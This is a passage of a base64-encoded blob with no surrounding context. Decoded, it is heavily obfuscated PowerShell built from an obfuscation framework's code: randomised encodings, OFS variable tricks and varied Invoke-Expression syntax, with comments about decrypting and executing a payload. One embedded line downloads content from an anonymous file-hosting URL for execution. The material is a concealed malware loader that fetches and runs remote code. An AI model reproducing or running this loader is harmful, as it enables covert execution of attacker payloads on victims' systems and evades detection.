nIHN0cmluZy4KICAgICAgICAkbTNmZER2b2hBYmJsQiA9IChbQ2hhcltdXShXdUpKRVlDaWdjSWtXcmdsKCdTcGxpdCcpKSB8IEZvckVhY2gtT2JqZWN0IHskR19Vb3RRNlhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoKCgtMSArIDIpIC0gMSkuLjEpKSB7JEdfVU90cTZYRyA9ICRHX3VvVHE2WEcuVG9VcHBlcigpfSAkR19Vb1RRNlhnfSkgLUpvaW4gJycKICAgICJAQCIKICAgICAgICAkbEJ4b2M4MTdFM0FscjYxTE4gKz0gKChXVUpKRVlDSWdDaWtXUkdsKCctJykpICsgJE0zZmRkdm9IYUJCTGIgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoKDEgLSAxKSwxKSkgKyAod3VKamVZQ0lHY0lLd1JnTCgnJycpKSArICRSYW5kb21EZWxpbWl0ZXIgKyAnJycgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkpCiAgICB9CiAgICAkTGJ4b2M4MTdlM0FMUjYxTE4gPSAkbEJ4T2M4MTdlM0FMUjYxTG4uVHJpbSgpCiAgICAKICAgICMgUmFuZG9tbHkgc2VsZWN0IGJldHdlZW4gdmFyaW91cyBjb252ZXJzaW9uIHN5bnRheCBvcHRpb25zLgogICAgJENiSWRaTDZRVmRzID0gKFtDaGFyW11dKEdldC1SYW5kb20gLUlucHV0IEAoKHd1SkpleUNpZ2NJS1dyR2woJ1tTdHJpbmddJF8nKSksKCd7Mn17M317MX17MH0nLWYnKScsJ2luZygnLCckXy5UJywnb1N0cicpKSkgfCBGb3JFYWNoLU9iamVjdCB7JEdfdW9UcTZYRyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKCgwICsgMCkuLigtMSArIDIpKSkgeyRHX3VPVHE2WEcgPSAkR19Vb3RxNlhHLlRvVXBwZXIoKX0gJEdfVW90UTZ4Z30pIC1Kb2luICcnCiAgICAkUHc5SmNpSVA2YkVsSiAgPSBAKCkKICAgICRQVzlKY0lJUDZiRWxKICs9ICh3dWpKRVlDaUdDaWt3ckdsKCdbJENoYXJTdHJdJykpICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDEgKyAwKSkpICsgKHd1akpFeUNJZ2NJa1dSZ2woJygnKSkgKyAod1VKSkVZQ0lHQ0lrV1JHbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtICgtMSArIDIpKSwoMiAtIDEpKSkgKyAkc3hJckZUNmY2NTVxREhubyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgzIC0gMikpKSArICh3dUpKRVlDSUdDaUt3UkdsKCcoJykpICsgKHd1SkpFWUNJR0NJS1dSZ2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoKCgxIC0gMSkgKyAwKSwoMyAtIDIpKSkgKyAkY2JpRFpsNnFWRFMgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoMCArIDEpKSkgKyAoV3VqSmV5Q0lHQ2lrV3JHTCgnKScpKSArICh3VUpKRVlDaWdjSUtXcmdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDIgLSAxKSkpICsgKHd1ampFeUNJZ0NpS1dSZ2woJywnKSkgKyAkZ01kX2pPOEljaVAgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoV3VqSkVZQ0lnQ0lrV3JHbCgnKScpKSArIChXdWpKRXljSWdDSWtXcmdMKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksMSkpICsgKHd1akpFeUNpR0Npa3dyZ2woJyknKSkKICAgICRwVzlKY2lJUDZiRWxqICs9ICRTWGlSZlQ2ZjY1NXFESE5PICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHd1SkplWUNJZ0Npa1dyR0woJygnKSkgKyAoV3VqSkV5Y2lHY2lrd3JHbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLDEpKSArICRjYklEWmw2cVZkcyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLCgtKDIgLSAxKSArICgyICsgMCkpKSkgKyAoV3VKSkVZQ2lnY0lLV3JnbCgnKScpKSArIChXdUpKZVlDSUdjaUt3UkdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksKDEgKyAwKSkpICsgKHd1SmplWWNJZ0NJS3dyR0woJywnKSkgKyAoV3VKSkVZQ0lHQ0lLd1JHTCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMCArICgxIC0gMSkpLCgyIC0gMSkpKSArICRHbWRfSk84SWNJUCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgyIC0gMSkpKSArICh3VUpKRXlDSUdjaUtXcmdsKCcpJykpICsgKFd1SkplWUNpR2NpS1dSZ2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoKDYgLSAzKSAtIDIpKSkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgod3VKamVZQ0lnQ0lLV3JnbCgnLWFzJykpLCh3dUpqRVlDaUdjSWt3cmdsKCctQXMnKSksKFd1SkpFWWNJR2Npa3dyZ2woJy1hUycpKSwod3VqakV5Q0lHQ0lLV3JnbCgnLUFTJykpKSkgKyAod1VKamVZQ0lHQ0lrd3JnTCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLDEpKSArICh3dUpqZVlDaWdDaUtXckdMKCdbJENoYXJTdHJdJykpCiAgICAkUFc5amNJaXA2YkVsSiA9IChHZXQtUmFuZG9tIC1JbnB1dCAkUFc5SmNJaVA2QkVsSikKICAgICJAQCIKICAgICMgQ3JlYXRlIGFycmF5IHN5bnRheCBmb3IgZW5jb2RlZCAkU2NyaXB0U3RyaW5nIGFzIGFsdGVybmF0aXZlIHRvIC5TcGxpdC8tU3BsaXQgc3ludGF4LgogICAgJGpxMmVRQ0RXRFJRNVI0aENTVXR0ID0gKFd1SmpFWUNJR2NJa3dyZ0woJycpKQogICAgKFtDaGFyW11dJFE3eGFxTnExeTg4ZSkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgIyBFbmNhcHN1bGF0ZSBjdXJyZW50IGl0ZW0gd2l0aCBzaW5nbGUgcXVvdGUgaWYgaXQgY29udGFpbnMgYSBub24taW50ZWdlci4KICAgICAgICBJZihbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkZ21kX2pvOElDaVApLlRyaW0oKHd1amplWUNpR2NpS1dSZ0woJzAxMjM0NTY3ODknKSkpLkxlbmd0aCAtZ3QgKDEgLSAxKSkgeyRkUWxqdVRFZnM5MWJUQlJKSGZCWiA9ICh3dUpqZVlDaWdDSUt3UmdsKCcnJykpfQogICAgICAgIEVsc2UgeyRRdW90ZSA9IChUM2k5VDVlakliWG0xRG55ZTNNRUZjNXMwaWVwMVVPMmYoJycpKX0KICAgICAgICAkRW5jb2RlZEFycmF5ICs9ICgkUXVvdGUgKyBbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkRW5jb2RpbmdCYXNlKSArICRRdW90ZSArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5VDVlamliWG0xZE55RTNtZWZjNXMwaUVQMVVvMkYoJywnKSkgKyAoVDNJOVQ1ZUpJQnhtMUROeUUzbUVmQzVTMGllcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpKQogICAgfQogICAgIkBAIgogICAgIyBSZW1vdmUgdHJhaWxpbmcgY29tbWEgZnJvbSAkRW5jb2RlZEFycmF5LgogICAgJEVuY29kZWRBcnJheSA9ICgoVDNpOXQ1ZWpJQlhNMURueUUzbUVmYzVTMEllcDFVTzJmKCcoJykpICsgKFQzaTlUNUVqSUJ4bTFEblllM01FZmM1UzBpRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRFbmNvZGVkQXJyYXkuVHJpbSgpLlRyaW0oKHQzSTl0NUVqaWJ4bTFEbnllM21FRmM1czBpRXAxVU8yRignLCcpKSkgKyAoVDNJOXQ1ZUppYnhNMWRueUUzbWVmYzVzMEllUDFVTzJGKCcpJykpKQoKICAgICMgbSgpIHJhbmRvbSBzeW50YXggdG8gY3JlYXRlL3NldCBPRlMgdmFyaWFibGUgKCRPRlMgaXMgdGhlIE91dHB1dCBGaWVsZCBTZXBhcmF0b3IgYXV0b21hdGljIHZhcmlhYmxlKS4KICAgICMgVXNpbmcgU2V0LUl0ZW0gYW5kIFNldC1WYXJpYWJsZS9TVi9TRVQgc3ludGF4LiBOb3QgdXNpbmcgTmV3LUl0ZW0gaW4gY2FzZSBPRlMgdmFyaWFibGUgYWxyZWFkeSBleGlzdHMuCiAgICAjIElmIHRoZSBPRlMgdmFyaWFibGUgZGlkIGV4aXN0cyB0aGVuIHdlIGNvdWxkIHVzZSBldmVuIG1vcmUgc3ludGF4OiAkdmFybmFtZSwgU2V0LVZhcmlhYmxlL1NWLCBTZXQtSXRlbS9TRVQsIEdldC1WYXJpYWJsZS9HVi9WYXJpYWJsZSwgR2V0LUNoaWxkSXRlbS9HQ0kvQ2hpbGRJdGVtL0Rpci9McwogICAgIyBGb3IgbW9yZSBpbmZvOiBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9wb3dlcnNoZWxsL3JlZmVyZW5jZS81LjEvbWljcm9zb2Z0LnBvd2Vyc2hlbGwuY29yZS9hYm91dC9hYm91dF9hdXRvbWF0aWNfdmFyaWFibGVzCiAgICAkU2V0T2ZzVmFyU3ludGF4ICAgICAgPSBAKCkKICAgICRTZXRPZnNWYXJTeW50YXggICAgICs9IChUM2k5dDVFamlCeG0xRE55ZTNNZUZjNVMwaUVwMXVvMkYoJ1NldC1JdGVtJykpICsgKFQzSTl0NUVKaUJ4TTFEbnlFM21FRmM1czBJRVAxVU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArICh0M2k5dDVlaklieG0xRE55RTNNRWZjNVMwaUVwMVVPMmYoJydWYXJpYWJsZTpPRlMnJykpICsgKHQzSTl0NWVKSUJ4bTFEbllFM21lZmM1UzBJZXAxdU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM2k5dDVlaklieG0xRG55RTNtRWZjNXMwaUVwMVVPMkYoJycnJykpCiAgICAkU2V0T2ZzVmFyU3ludGF4ICAgICArPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNJOXQ1ZUppYlhtMUROeUUzbUVmQzVTMElFcDFVbzJmKCdTZXQtVmFyaWFibGUnKSksKFQzSTlUNWVKaWJ4bTFEbnlFM01FZmM1UzBpRXAxVW8yZignU1YnKSksKFQzSTlUNUVKSUJ4TTFETnlFM01FZmM1czBpRVAxVU8yZignU0VUJykpKSkgKyAoVDNJOXQ1RUpJQnhNMWROeUUzbUVmYzVTMElFUDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDEsMikpICsgKHQzSTl0NUVKSWJ4TTFkTnlFM01FZmM1czBpRVAxVW8yZignJ09GUycnKSkgKyAoVDNJOVQ1ZWpJYlhNMUROeWUzbUVGYzVTMGlFcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDEsMikpICsgKFQzSTl0NWVKSUJYTTFkbnlFM21FZmM1czBpRVAxdU8yRignJycnKSkKICAgICRTZXRPZnNWYXIgICAgICAgICAgICA9IChHZXQtUmFuZG9tIC1JbnB1dCAkU2V0T2ZzVmFyU3ludGF4KQoKIkAKICAgIChJV1IgLVVSSSBodHRwczovL2Fub25maWxlcy5jb20vdWZydHNhMHltNSAtVXNlQmFzaWNQYXJzaW5nKS5jb250ZW50CiQ2QlFkVlhqMzZxeWVoYXh5NzlWZGhyN0dack5WN3BnYzJBQmpmTHg1alFoc0VuWkJjNyA9IEAiCiAkU2V0T2ZzVmFyQmFja1N5bnRheCAgPSAlKCkKICAgICRTZXRPZnNWYXJCYWNrU3ludGF4ICs9IChUM2k5dDVlSklCeG0xRE5ZRTNtZWZDNVMwaUVwMXVPMmYoJ1NldC1JdGVtJykpICsgKHQzSTlUNWVKSWJYTTFETnlFM21lZmM1czBpRXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5VDVlaklCeE0xRG55RTNNRWZjNXMwaUVwMVVvMkYoJydWYXJpYWJsZTpPRlMnJykpICsgKHQzaTl0NWVqaUJ4bTFEbnlFM01lRmM1UzBJRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArICh0M2k5dDVlamlCeG0xRG55RTNtRUZjNXMwaWVQMVVPMkYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2tTeW50YXggKz0gKEdldC1SYW5kb20gLUlucHV0IEAoKHQzSTl0NWVKaUJ4bTFEbnlFM21FRmM1czBJRXAxVW8yRignU2V0LVZhcmlhYmxlJykpLChUM2k5VDVlSmliWG0xRG55RTNtRWZjNXMwaUVwMXVvMkYoJ1NWJykpLChUM0k5dDVlaklieE0xRG5ZZTNtRUZDNXMwaWVwMVVvMmYoJ1NFVCcpKSkpICsgKHQzSTl0NWVqSWJYbTFEbnlFM01lZkM1czBpRXAxVU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5dDVFamlCeE0xZE5ZRTNtRUZDNXMwaWVwMXVPMkYoJydPRlMnJykpICsgKFQzaTl0NWVqaWJ4bTFEbnlFM01FZmM1UzBJRVAxdU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM2k5VDVFamlCeE0xRE55RTNNZUZDNXMwSUVwMVVPMmYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2sgICAgICAgID0gKEdldC1SYW5kb20gLUlucHV0ICRTZXRPZnNWYXJCYWNrU3ludGF4KQoKICAgICMgUmFuZG9taXplIGNhc2Ugb2YgJFNldE9mc1ZhciBhbmQgJFNldE9mc1ZhckJhY2suCiAgICAkU2V0T2ZzVmFyICAgICAgICAgICAgPSAoW0NoYXJbXV0kU2V0T2ZzVmFyICAgICB8IEZvckVhY2gtT2JqZWN0IHskQ2hhciA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JENoYXIgPSAkQ2hhci5Ub1VwcGVyKCl9ICRDaGFyfSkgLUpvaW4gJycKICAgICRTZXRPZnNWYXJCYWNrICAgICAgICA9IChbQ2hhcltdXSRTZXRPZnNWYXJCYWNrIHwgRm9yRWFjaC1PYmplY3QgeyRDaGFyID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQ2hhciA9ICRDaGFyLlRvVXBwZXIoKX0gJENoYXJ9KSAtSm9pbiAnJwogICAgIkBAIgogICAgIyBtKCkgdGhlIGNvZGUgdGhhdCB3aWxsIGRlY3J5cHQgYW5kIGV4ZWN1dGUgdGhlIHBheWxvYWQgYW5kIHJhbmRvbWx5IHNlbGVjdCBvbmUuCiAgICAkQmFzZVNjcmlwdEFycmF5ICA9IEAoKQogICAgJEJhc2VTY3JpcHRBcnJheSArPSAodDNJOVQ1RWpJQlhtMURueUUzbUVGYzVTMEllUDFVbzJmKCcoJykpICsgKHQzSTlUNWVKaWJ4bTFEblllM01FZmM1UzBpRXAxdU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5dDVlaklieG0xRG55RTNNRWZjNXMwSUVwMVVPMmYoJycnKSkgKyAkeE5UajJ3ODF2aiArICgnezB9Jy1mJycuJykgKyAkU3BsaXQgKyAnKCcgKyAodDNJOVQ1ZUppQnhNMWRuWWUzbUVGYzVzMGllcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NWVKSWJ4TTFkbnlFM21FZkM1czBpRXAxdU8yRignJycpKSArICRwT1NHSnpUICsgJycnICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzaTl0NUVKaWJ4bTFETnllM21lZmM1czBJZXAxVU8yZignKScpKSArIChUM2k5dDVlamlieG0xRG55RTNtZUZjNVMwaUVwMVVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNpOVQ1ZWpJYlhNMUROWUUzbUVGQzVzMElFcDF1TzJGKCd8JykpICsgKFQzaTlUNWVqSWJ4bTFkblllM21FZmM1UzBpRVAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRGb3JFYWNoT2JqZWN0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NWVqaWJYbTFkTlllM21FZmM1czBpRXAxVU8yRigneycpKSArICh0M0k5dDVlaklieG0xZG55ZTNtZUZDNXMwaUVwMXVvMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNpOXQ1RUpJQnhtMURueUUzbWVmQzVzMGllcDF1TzJGKCcoJykpICsgKFQzaTl0NWVKSUJ4TTFkbnlFM21FRkM1czBpRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21Db252ZXJzaW9uU3ludGF4ICsgJyknICsgICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM2k5dDVlamlCWG0xRG55ZTNNRWZDNVMwaUVwMVVvMmYoJ30nKSkgKyAodDNJOXQ1ZWppQnhNMUROeUUzbWVGYzVzMElFcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NWVKSUJ4bTFkbllFM21FRmM1czBpRXAxVW8yRignKScpKQogICAgJEJhc2VTY3JpcHRBcnJheSArPSAodDNJOVQ1ZWpJQlhtMWROeUUzTUVGYzVzMEllcDF1TzJGKCcoJykpICsgKFQzaTl0NUVqSUJ4bTFETnlFM01lRmM1UzBpRXAxdW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlaklCWG0xZE5ZRTNtZWZjNVMwaUVQMVVPMmYoJycnKSkgKyAkWE5USjJ3ODF2aiArICcnJyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21EZWxpbWl0ZXJzVG9QcmludEZvckRhc2hTcGxpdCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5dDVlaklieG0xRG5ZRTNNRWZDNXMwSWVwMVVPMmYoJ3wnKSkgKyAoVDNJOXQ1ZWppQnhNMUROWWUzbUVGYzVzMElFUDF1bzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEZvckVhY2hPYmplY3QgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNpOVQ1ZWppQlhNMWRuWUUzbUVmYzVzMGlFcDF1bzJmKCd7JykpICsgKFQzaTl0NWVKSWJ4bTFkbllFM01FRkM1czBpRVAxdW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklCeE0xZG5ZRTNNZWZjNXMwSWVQMVVPMmYoJygnKSkgKyAodDNpOXQ1RUpJQnhtMURueUUzbUVmYzVzMEllUDF1TzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJFJhbmRvbUNvbnZlcnNpb25TeW50YXggKyAnKScgKyAgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NWVKSWJYbTFkbnlFM01FZmM1czBpRXAxVU8yZignfScpKSArIChUM0k5dDVFaklCeE0xZG55RTNtRUZjNXMwaWVwMXVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1RUppQnhtMURueUUzbUVmYzVzMGllUDFVTzJmKCcpJykpCiAgICAkQmFzZVNjcmlwdEFycmF5ICs9ICh0M0k5dDVlSklieG0xRG55RTNtRUZjNXMwSUVQMXVPMmYoJygnKSkgKyAoVDNpOXQ1ZWpJQnhNMURueUUzbWVmYzVzMGllcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEVuY29kZWRBcnJheSArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5VDVlamliWG0xRG55RTNtRUZjNVMwSWVwMVVPMmYoJ3wnKSkgKyAodDNJOVQ1ZWpJQnhNMURueWUzbUVmYzVzMGllcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEZvckVhY2hPYmplY3QgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1RUppQnhNMUROeUUzbWVmYzVzMEllcDF1TzJmKCd7JykpICsgKFQzaTlUNWVKSUJYTTFkbnlFM21FZkM1czBJRXAxVU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5dDVlamlieE0xRG5ZZTNtRWZjNVMwaUVwMVVPMmYoJygnKSkgKyAoVDNpOXQ1RUpJQlhtMWROeUUzbUVmYzVTMEllcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJFJhbmRvbUNvbnZlcnNpb25TeW50YXggKyAnKScgKyAgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTlUNWVqaWJYbTFETnlFM21FZmM1UzBJZVAxVU8yZignfScpKSArIChUM0k5dDVlSmlCWG0xRG55RTNtRWZDNXMwaWVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOVQ1RUppQnhNMURueUUzTWVGYzVzMGlFUDF1TzJmKCcpJykpCiAgICAKICAgICMgbSgpIHJhbmRvbSBKT0lOIHN5bnRheCBmb3IgYWxsIGFib3ZlIG9wdGlvbnMuCiAgICAkTmV3U2NyaXB0QXJyYXkgICA9IEAoKQogICAgJE5ld1NjcmlwdEFycmF5ICArPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEJhc2VTY3JpcHRBcnJheSkgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkSm9pbiArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5dDVlaklCeG0xZE55ZTNtRUZDNXMwaUVQMVVPMmYoJycnJykpCiAgICAkTmV3U2NyaXB0QXJyYXkgICs9ICRKb2luICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKEdldC1SYW5kb20gLUlucHV0ICRCYXNlU2NyaXB0QXJyYXkpCiAgICAkTmV3U2NyaXB0QXJyYXkgICs9ICRTdHJKb2luICsgJygnICsgKFQzSTl0NWVKaUJ4bTFETllFM21lZmM1czBpZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5dDVlamlCWG0xZG5ZRTNNZWZjNVMwaWVQMVVvMkYoJycnJykpICsgKFQzSTlUNWVqSWJ4TTFEbnllM01lRmM1czBpRVAxdU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklCWE0xZG55RTNNRWZjNXMwSWVQMVVPMmYoJywnKSkgKyAoVDNJOVQ1ZWpJQlhNMURueWUzbWVmYzVTMGllUDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKEdldC1SYW5kb20gLUlucHV0ICRCYXNlU2NyaXB0QXJyYXkpICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzSTlUNWVqSWJ4bTFkbnlFM01FRkM1czBpRXAxVU8yZignKScpKQogICAgIkBAIgogICAgIyBSYW5kb21seSBzZWxlY3Qgb25lIG9mIHRoZSBhYm92ZSBjb21tYW5kcy4KICAgICROZXdTY3JpcHQgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJE5ld1NjcmlwdEFycmF5KQoKICAgICMgbSgpIHJhbmRvbSBpbnZva2Ugb3BlcmF0aW9uIHN5bnRheC4KICAgICMgQmVsb3cgY29kZSBibG9jayBpcyBhIGNvcHkgZnJvbSBPdXQtT2JmdXNjYXRlZFN0cmluZ0NvbW1hbmQucHMxLiBJdCBpcyBjb3BpZWQgaW50byB0aGlzIGVuY29kaW5nIGZ1bmN0aW9uIHNvIHRoYXQgdGhpcyB3aWxsIHJlbWFpbiBhIHN0YW5kYWxvbmUgc2NyaXB0IHdpdGhvdXQgZGVwZW5kZW5jaWVzLgogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggID0gQCgpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgodDNJOXQ1ZWpJYnhNMWRueUUzTUVmYzVzMGlFcDF1TzJmKCdJRVgnKSksKFQzSTl0NWVqSWJYbTFEbnlFM21FRkM1czBpZXAxVU8yZignSW52b2tlLUV4cHJlc3Npb24nKSkpKQogICAgIyBBZGRlZCBiZWxvdyBzbGlnaHRseS1yYW5kb21pemVkIG9iZnVzY2F0ZWQgd2F5cyB0byBmb3JtIHRoZSBzdHJpbmcgJ2lleCcgYW5kIHRoZW4gaW52b2tlIGl0IHdpdGggLiBvciAmLgogICAgIyBUaG91Z2ggZmFyIGZyb20gZnVsbHkgYnVpbHQgb3V0LCB0aGVzZSBhcmUgaW5jbHVkZWQgdG8gaGlnaGxpZ2h0IGhvdyBJRVgvSW52b2tlLUV4cHJlc3Npb24gaXMgYSBncmVhdCBpbmRpY2F0b3IgYnV0IG5vdCBhIHNpbHZlciBidWxsZXQuCiAgICAjIFRoZXNlIG1ldGhvZHMgZHJhdyBvbiBjb21tb24gZW52aXJvbm1lbnQgdmFyaWFibGUgdmFsdWVzIGFuZCBQb3dlclNoZWxsIEF1dG9tYXRpYyBWYXJpYWJsZSB2YWx1ZXMvbWV0aG9kcy9tZW1iZXJzL3Byb3BlcnRpZXMvZXRjLgogICAgJEludm9jYXRpb25PcGVyYXRvciA9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM0k5dDVlaklCWG0xRG55RTNNZUZDNVMwaUVwMVVvMkYoJy4nKSksKHQzSTl0NWVqSWJ4bTFETnlFM21lZmM1czBJRXAxVU8yZignJicpKSkpICsgKFQzSTl0NUVKSUJYbTFkbllFM21FRkM1UzBpRXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKQogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICgneygoMyAtIDEpICogNCl9ezd9eygoW2ludF0oNiAvIDIpKSAqICg0IC0gMikpfXs5fXsoMSAtICgyIC0gMSkpfXsxfXsoNSAtICg0IC0gMikpfXsoKFtpbnRdKDI0IC8gMykpIC0gKDMgKyAwKSl9ezJ9eygoNCAtIDIpICogMil9eygyICogKC00ICsgOSkpfSctZicxXSsnLCdgJFNtSmwxTUgxTUxrbCcsJ1soMSAqICgyNyAtIDE0KSknLCdoZWwnLCddKycnLCdsSWQnLCdlbGwnLCckU2gnLCcoIGAnLCdJZFsnLCd4JyknKQogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICgneyg5IC0gNCl9eygyICsgKC0xICsgMikpfXsoMSAtICgzIC0gMikpfXsoKDQgLSAyKSAqICgzIC0gMSkpfXsyfXsoLSgzIC0gMikgKyAoMyAtIDEpKX0nLWYnUFMnLCdbJywnbWUnLCdgJGRpYXNOaXJ6U2o3QicsJ0hvJywnKCAnKSArIChHZXQtUmFuZG9tIC1JbnB1dCBAKDQsMjEpKSArICh0M0k5dDVlSklCeG0xRG5ZRTNNZUZDNVMwaUVwMXVvMkYoJ10rYCRQc2hvTWVbJykpICsgKEdldC1SYW5kb20gLUlucHV0IEAoMzAsMzQpKSArICh0M0k5VDVlaklieG0xRE5ZZTNtZWZDNXMwaUVwMXVPMmYoJ10rJ3gnKScpKQogICAgIkBAIgogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICgneygyICogMil9eygxICogNSl9ezJ9ezF9ezB9ezN9Jy1mJ3BlYycsJ29tUycsJ3Y6QycsJ1soMiAqIDIpLCcsJyggYCcsJyRsMFFXaEoxMUVmMVRIcCcpICsgKEdldC1SYW5kb20gLUlucHV0IEAoMTUsMjQsMjYpKSArIChUM0k5dDVlamlCWE0xRG55RTNNRWZjNXMwSUVQMVVPMmYoJywoLSgwICsgMSkgKyAyNildLUpvaW4nJyknKSkKICAgICRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9ICRJbnZvY2F0aW9uT3BlcmF0b3IgKyAoJ3swfSctZicoKCcpICsgK